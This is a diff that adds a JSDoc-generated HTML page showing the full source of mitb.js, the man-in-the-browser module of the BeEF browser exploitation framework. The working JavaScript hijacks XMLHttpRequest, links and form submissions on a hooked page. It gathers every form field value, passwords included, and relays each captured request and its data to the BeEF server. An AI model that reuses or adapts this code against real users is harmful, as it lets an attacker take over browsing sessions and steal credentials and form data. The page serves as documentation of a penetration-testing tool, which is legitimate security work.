@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>JSDoc: Source: mitb.js</title>
+
+    <script src="scripts/prettify/prettify.js"> </script>
+    <script src="scripts/prettify/lang-css.js"> </script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <link type="text/css" rel="stylesheet" href="styles/prettify-tomorrow.css">
+    <link type="text/css" rel="stylesheet" href="styles/jsdoc-default.css">
+</head>
+
+<body>
+
+<div id="main">
+
+    <h1 class="page-title">Source: mitb.js</h1>
+
+    
+
+
+
+    
+    <section>
+        <article>
+            <pre class="prettyprint source linenums"><code>//
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * @namespace beef.mitb
+ */
+beef.mitb = {
+
+    cid:null,
+    curl:null,
+
+    /** Initializes */ 
+    init:function (cid, curl) {
+        beef.mitb.cid = cid;
+        beef.mitb.curl = curl;
+        /*Override open method to intercept ajax request*/
+        var hook_file = "&lt;%= @hook_file %>";
+
+        if (window.XMLHttpRequest &amp;&amp; !(window.ActiveXObject)) {
+
+            beef.mitb.sniff("Method XMLHttpRequest.open override");
+            (function (open) {
+                XMLHttpRequest.prototype.open = function (method, url, async, mitb_call) {
+                    // Ignore it and don't hijack it. It's either a request to BeEF (hook file or Dynamic Handler)
+                    // or a request initiated by the MiTB itself.
+                    if (mitb_call || (url.indexOf(hook_file) != -1 || url.indexOf("/dh?") != -1)) {
+                        open.call(this, method, url, async, true);
+                    }else {
+                        var portRegex = new RegExp(":[0-9]+");
+                        var portR = portRegex.exec(url);
+                        var requestPort;
+                        if (portR != null) { requestPort = portR[0].split(":")[1]; }
+
+                        //GET request
+                        if (method == "GET") {
+                            //GET request -> cross-origin
+                            if (url.indexOf(document.location.hostname) == -1 || (portR != null &amp;&amp; requestPort != document.location.port )) {
+                                beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
+                                window.open(url);
+                            }else { //GET request -> same-origin
+                                beef.mitb.sniff("GET [Ajax Request]: " + url);
+                                if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
+                                    var title = "";
+                                    if (document.getElementsByTagName("title").length == 0) {
+                                        title = document.title;
+                                    } else {
+                                        title = document.getElementsByTagName("title")[0].innerHTML;
+                                    }
+                                    // write the url of the page
+                                    history.pushState({ Be:"EF" }, title, url);
+                                }
+                            }
+                        }else{
+                            //POST request
+                            beef.mitb.sniff("POST ajax request to: " + url);
+                            open.call(this, method, url, async, true);
+                        }
+                    }
+                };
+            })(XMLHttpRequest.prototype.open);
+        }
+    },
+
+    /** Initializes the hook on anchors and forms. */ 
+    hook:function () {
+        beef.onpopstate.push(function (event) {
+            beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);
+        });
+        beef.onclose.push(function (event) {
+            beef.mitb.endSession();
+        });
+
+        var anchors = document.getElementsByTagName("a");
+        var forms = document.getElementsByTagName("form");
+        var lis = document.getElementsByTagName("li");
+
+        for (var i = 0; i &lt; anchors.length; i++) {
+            anchors[i].onclick = beef.mitb.poisonAnchor;
+        }
+        for (var i = 0; i &lt; forms.length; i++) {
+            beef.mitb.poisonForm(forms[i]);
+        }
+
+        for (var i = 0; i &lt; lis.length; i++) {
+            if (lis[i].hasAttribute("onclick")) {
+                lis[i].removeAttribute("onclick");
+                /*clear*/
+                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick('" + lis[i].getElementsByTagName("a")[0] + "')");
+                /*override*/
+
+            }
+        }
+    },
+
+    /** Hooks anchors and prevents them from linking away */
+    poisonAnchor:function (e) {
+        try {
+            e.preventDefault;
+            if (beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])) {
+                var title = "";
+                if (document.getElementsByTagName("title").length == 0) {
+                    title = document.title;
+                } else {
+                    title = document.getElementsByTagName("title")[0].innerHTML;
+                }
+                history.pushState({ Be:"EF" }, title, e.currentTarget);
+            }
+        } catch (e) {
+            beef.debug('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
+        }
+        return false;
+    },
+
+    /** Hooks forms and prevents them from linking away */
+    poisonForm:function (form) {
+        form.onsubmit = function (e) {
+
+            // Collect &lt;input> tags.
+            var inputs = form.getElementsByTagName("input");
+            var query = "";
+            for (var i = 0; i &lt; inputs.length; i++) {
+                switch (inputs[i].type) {
+                    case "submit":
+                        break;
+                    default:
+                        query += inputs[i].name + "=" + inputs[i].value + '&amp;';
+                        break;
+                }
+            }
+
+            // Collect selected options from the form.
+            var selects = form.getElementsByTagName("select");
+            for (var i = 0; i &lt; selects.length; i++) {
+                var select = selects[i];
+                query += select.name + "=" + select.options[select.selectedIndex].value + '&amp;';
+            }
+
+            // We should be gathering 'submit' inputs as well, as there are 
+            // applications demanding this parameter.
+            var submit = $j('*[type="submit"]', form);
+            if(submit.length) {
+                // Append name of the submit button/input.
+                query += submit.attr('name') + '=' + submit.attr('value');
+            }
+
+            if(query.slice(-1) == '&amp;') {
+                query = query.slice(0, -1);
+            }
+
+            e.preventdefault;
+            beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
+            history.pushState({ Be:"EF" }, "", form.action);
+            return false;
+        }
+    },
+
+    /** Fetches a hooked form with AJAX */ 
+    fetchForm:function (url, query, target) {
+        try {
+            var y = new XMLHttpRequest();
+            y.open('POST', url, false, true);
+            y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            y.onreadystatechange = function () {
+                if (y.readyState == 4 &amp;&amp; y.responseText != "") {
+                    target.innerHTML = y.responseText;
+                    setTimeout(beef.mitb.hook, 10);
+                }
+            };
+            y.send(query);
+            beef.mitb.sniff("POST: " + url + "[" + query + "]");
+            return true;
+        } catch (x) {
+            return false;
+        }
+    },
+
+    /** Fetches a hooked link with AJAX */
+    fetch:function (url, target) {
+        try {
+            var y = new XMLHttpRequest();
+            y.open('GET', url, false, true);
+            y.onreadystatechange = function () {
+                if (y.readyState == 4 &amp;&amp; y.responseText != "") {
+                    target.innerHTML = y.responseText;
+                    setTimeout(beef.mitb.hook, 10);
+                }
+            };
+            y.send(null);
+            beef.mitb.sniff("GET: " + url);
+            return true;
+        } catch (x) {
+            window.open(url);
+            beef.mitb.sniff("GET [New Window]: " + url);
+            return false;
+        }
+    },
+
+    /** Fetches a window.location=http://domainname.com and setting up history */ 
+    fetchOnclick:function (url) {
+        try {
+            var target = document.getElementsByTagName("html")[0];
+            var y = new XMLHttpRequest();
+            y.open('GET', url, false, true);
+            y.onreadystatechange = function () {
+                if (y.readyState == 4 &amp;&amp; y.responseText != "") {
+                    var title = "";
+                    if (document.getElementsByTagName("title").length == 0) {
+                        title = document.title;
+                    }
+                    else {
+                        title = document.getElementsByTagName("title")[0].innerHTML;
+                        }
+                    history.pushState({ Be:"EF" }, title, url);
+                    target.innerHTML = y.responseText;
+                    setTimeout(beef.mitb.hook, 10);
+                }
+            };
+            y.send(null);
+            beef.mitb.sniff("GET: " + url);
+
+        } catch (x) {
+            // the link is cross-origin, so load the resource in a different tab
+            window.open(url);
+            beef.mitb.sniff("GET [New Window]: " + url);
+        }
+    },
+
+    /** Relays an entry to the framework */
+    sniff:function (result) {
+        try {
+            beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
+        } catch (x) {
+        }
+        return true;
+    },
+
+    /** Signals the Framework that the user has lost the hook */
+    endSession:function () {
+        beef.mitb.sniff("Window closed.");
+    }
+};
+
+beef.regCmp('beef.mitb');
+</code></pre>
+        </article>
+    </section>
+
+
+
+
+</div>
+
+<nav>
+    <h2><a href="index.html">Home</a></h2><h3>Namespaces</h3><ul><li><a href="beef.are.html">are</a></li><li><a href="beef.browser.html">browser</a></li><li><a href="beef.browser.cookie.html">cookie</a></li><li><a href="beef.browser.popup.html">popup</a></li><li><a href="beef.dom.html">dom</a></li><li><a href="beef.encode.base64.html">base64</a></li><li><a href="beef.encode.json.html">json</a></li><li><a href="beef.geolocation.html">geolocation</a></li><li><a href="beef.hardware.html">hardware</a></li><li><a href="beef.init.html">init</a></li><li><a href="beef.logger.html">logger</a></li><li><a href="beef.mitb.html">mitb</a></li><li><a href="beef.net.html">net</a></li><li><a href="beef.net.connection.html">connection</a></li><li><a href="beef.net.cors.html">cors</a></li><li><a href="beef.net.dns.html">dns</a></li><li><a href="beef.net.local.html">local</a></li><li><a href="beef.net.portscanner.html">portscanner</a></li><li><a href="beef.net.requester.html">requester</a></li><li><a href="beef.net.xssrays.html">xssrays</a></li><li><a href="beef.os.html">os</a></li><li><a href="beef.session.html">session</a></li><li><a href="beef.timeout.html">timeout</a></li><li><a href="beef.updater.html">updater</a></li><li><a href="beef.webrtc.html">webrtc</a></li><li><a href="beef.websocket.html">websocket</a></li><li><a href="BeefJS.html">BeefJS</a></li><li><a href="browser_jools.html">browser_jools</a></li><li><a href="platform.html">platform</a></li></ul>
+</nav>
+
+<br class="clear">
+
+<footer>
+    Documentation generated by <a href="https://github.com/jsdoc/jsdoc">JSDoc 3.6.3</a> on Thu Jan 02 2020 16:29:11 GMT+1000 (Australian Eastern Standard Time)
+</footer>
+
+<script> prettyPrint(); </script>
+<script src="scripts/linenumber.js"> </script>
+</body>
+</html>
